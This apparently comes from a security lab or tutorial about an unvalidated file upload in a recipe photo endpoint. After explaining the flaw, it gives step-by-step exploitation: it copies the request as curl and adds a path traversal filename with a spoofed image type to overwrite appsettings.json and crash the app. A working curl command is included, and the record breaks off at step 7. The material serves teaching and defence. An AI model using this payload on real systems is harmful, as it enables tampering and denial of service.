## File Upload Vulnerability – Inadequate Validation

### What is the Vulnerability?

A file upload vulnerability occurs when the backend accepts uploaded files **without enforcing strict validation** on file properties such as type, size, content, and storage path.

When multiple validation layers are missing, an attacker can upload files that negatively impact application availability or integrity.

---

### Why is this Dangerous?

Uploaded files can be used to:

* Overwrite application or configuration files
* Exhaust disk space or memory
* Bypass file-type restrictions
* Break application startup or runtime behavior
* Stored malicious content, Files later served to users, enabling XSS or client-side attacks
* Persistence, Attacker-controlled files remaining on disk across restarts

This can lead to **denial of service (DoS)** or broader compromise.

---

### Scenario Overview

The UI allows users to upload a recipe photo.

The backend does **not strictly validate**:

* File size limits
* File extension
* File content (magic bytes)
* Storage path and filename normalization

---

### Practical Observation (Using Developer Tools)

The browser’s **Developer Tools** can be used to inspect the multipart file upload request. By modifying the request payload, an attacker can control:

* The uploaded filename
* The file extension
* The file size
* The actual file content

---

Example attacker-controlled characteristics:

```text
Filename: ../../../../appsettings.json
Extension: .json
Content-Type: image/png
Actual Content: configuration file
```

### Exploitation

1. Open DevTools and go to the Network tab

2. Use the app as normal — pick any photo and upload it. You just need the request to appear in the network log.

3. In the Network tab, look for the POST /api/recipes/.../photo request. Right-click it:

Right-click request → Copy → Copy as cURL (bash)
This copies the full request — cookies, headers, XSRF token, everything.

4. In your terminal, create the file you want to overwrite appsettings.json with:

echo '{"pwned": true}' > pwned.json
5. Modify the curl command — three changes

Change 1 — delete the content-type header. Browser-copied curl includes a hardcoded boundary in the content-type. Using -F makes curl generate its own boundary, causing a conflict that breaks the request body.

-H 'content-type: multipart/form-data; boundary=----WebKitFormBoundary...'
Do not keep this line. curl sets content-type automatically when using -F.
Change 2 — delete --data-raw. Remove the entire --data-raw $'...' block at the end of the copied command.

Change 3 — add -F with the traversal filename.

-F "photoFile=@pwned.json;filename=../../../../appsettings.json;type=image/png"
The @pwned.json is the local file to send. The filename= is what the server sees — that's where the traversal happens.

6. Run it and check the response

Your final command should look like this — all original cookies and headers kept, content-type removed, data-raw replaced with -F:

curl -X POST 'https://your-app/api/recipes/10002/photo' \
  -b 'bff=<your cookie>' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'x-xsrf-token: <your token>' \
  -F "photoFile=@pwned.json;filename=../../../../appsettings.json;type=image/png" \
  -v
A 200 OK response means the file was accepted. The app will crash on next restart — that's your proof of impact.

7. Confirm impact on the server side


---



